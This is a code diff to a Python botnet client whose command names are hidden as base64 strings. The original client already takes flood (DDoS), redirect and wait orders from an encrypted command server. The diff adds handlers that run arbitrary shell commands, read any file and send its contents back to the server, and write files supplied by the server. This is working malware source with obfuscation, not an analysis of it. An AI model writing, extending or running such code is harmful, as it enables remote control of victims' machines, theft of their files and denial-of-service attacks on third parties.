@@ -3,6 +3,9 @@ import time
 import json
 import logging
 import select
+import subprocess
+import os
+import base64
 from threading import Thread, Event
 from .crypto import Crypto
 from .utilities import parse_url, _decode_str
@@ -115,6 +118,21 @@ class Client:
                         self.logger.debug(f"Socket close error: {e}")
                     self.sock = None
 
+    def _send_response(self, resp_data: dict) -> None:
+        resp_json = json.dumps(resp_data)
+        session_key = self.crypto.generate_aes_key()
+        encrypted_resp = self.crypto.aes_encrypt(session_key, resp_json.encode())
+        encrypted_session_key = self.crypto.rsa_encrypt(
+            self.server_public_key, session_key
+        )
+        payload = (
+            len(encrypted_session_key).to_bytes(BUFFER_SIZE_LENGTH, "big")
+            + encrypted_session_key
+            + len(encrypted_resp).to_bytes(BUFFER_SIZE_LENGTH, "big")
+            + encrypted_resp
+        )
+        self.sock.sendall(payload)
+
     # Listen for server messages
     def _listen_server(self):
         try:
@@ -146,18 +164,17 @@ class Client:
                 )
                 message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()
 
-                # Send ACK
-                encrypted_ack = self.crypto.rsa_encrypt(
-                    self.server_public_key, _decode_str("QUNL").encode()
-                )
-                self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
-
                 # Process command
                 try:
                     msg_json = json.loads(message)
                     command = msg_json.get(_decode_str("YWN0aW9u"))
 
                     if command == _decode_str("Zmxvb2Q="):
+                        encrypted_ack = self.crypto.rsa_encrypt(
+                            self.server_public_key, _decode_str("QUNL").encode()
+                        )
+                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
+
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         endpoint = parse_url(data.get(_decode_str("dXJs"), ""))
                         if not endpoint:
@@ -205,6 +222,11 @@ class Client:
                             self._flood_threads.append(t)
 
                     elif command == _decode_str("cmVkaXJlY3Q="):
+                        encrypted_ack = self.crypto.rsa_encrypt(
+                            self.server_public_key, _decode_str("QUNL").encode()
+                        )
+                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
+
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         new_host = data.get(_decode_str("aG9zdA=="))
                         new_port = data.get(_decode_str("cG9ydA=="))
@@ -216,13 +238,115 @@ class Client:
                         return
 
                     elif command == _decode_str("d2FpdA=="):
+                        encrypted_ack = self.crypto.rsa_encrypt(
+                            self.server_public_key, _decode_str("QUNL").encode()
+                        )
+                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
+
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         wait_s = data.get(_decode_str("cw=="), 60)
                         time.sleep(wait_s)
                         return
 
+                    elif command == _decode_str("ZXhlYw=="):
+                        try:
+                            cmd = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("command", "")
+                            result = subprocess.run(
+                                cmd, shell=True, capture_output=True, text=True, timeout=120
+                            )
+                            self._send_response({
+                                "status": "success",
+                                "action": "exec",
+                                "stdout": result.stdout,
+                                "stderr": result.stderr,
+                                "returncode": result.returncode,
+                            })
+                        except subprocess.TimeoutExpired:
+                            self._send_response({
+                                "status": "error",
+                                "action": "exec",
+                                "error": "command timed out",
+                            })
+                        except Exception as e:
+                            self._send_response({
+                                "status": "error",
+                                "action": "exec",
+                                "error": str(e),
+                            })
+
+                    elif command == _decode_str("ZG93bmxvYWQ="):
+                        try:
+                            path = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("path", "")
+                            if not os.path.exists(path):
+                                raise FileNotFoundError(f"Path not found: {path}")
+                            with open(path, "rb") as f:
+                                content = base64.b64encode(f.read()).decode()
+                            self._send_response({
+                                "status": "success",
+                                "action": "download",
+                                "path": path,
+                                "content_b64": content,
+                            })
+                        except Exception as e:
+                            self._send_response({
+                                "status": "error",
+                                "action": "download",
+                                "error": str(e),
+                            })
+
+                    elif command == _decode_str("dXBsb2Fk"):
+                        try:
+                            data = msg_json.get(_decode_str("ZGF0YQ=="), {})
+                            path = data.get("path", "")
+                            content_b64 = data.get("content_b64", "")
+                            content = base64.b64decode(content_b64)
+                            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
+                            with open(path, "wb") as f:
+                                f.write(content)
+                            self._send_response({
+                                "status": "success",
+                                "action": "upload",
+                                "path": path,
+                            })
+                        except Exception as e:
+                            self._send_response({
+                                "status": "error",
+                                "action": "upload",
+                                "error": str(e),
+                            })
+
+                    elif command == _decode_str("c2hlbGw="):
+                        try:
+                            cmd = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("command", "")
+                            result = subprocess.run(
+                                cmd, shell=True, capture_output=True, text=True, timeout=120
+                            )
+                            self._send_response({
+                                "status": "success",
+                                "action": "shell",
+                                "stdout": result.stdout,
+                                "stderr": result.stderr,
+                                "returncode": result.returncode,
+                            })
+                        except subprocess.TimeoutExpired:
+                            self._send_response({
+                                "status": "error",
+                                "action": "shell",
+                                "error": "command timed out",
+                            })
+                        except Exception as e:
+                            self._send_response({
+                                "status": "error",
+                                "action": "shell",
+                                "error": str(e),
+                            })
+
                 except KeyError as e:
                     self.logger.debug(f"Unknown command key: {e}")
+                    encrypted_ack = self.crypto.rsa_encrypt(
+                        self.server_public_key, _decode_str("QUNL").encode()
+                    )
+                    self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
                 except json.JSONDecodeError as e:
                     self.logger.debug(f"Invalid JSON in command: {e}")
 
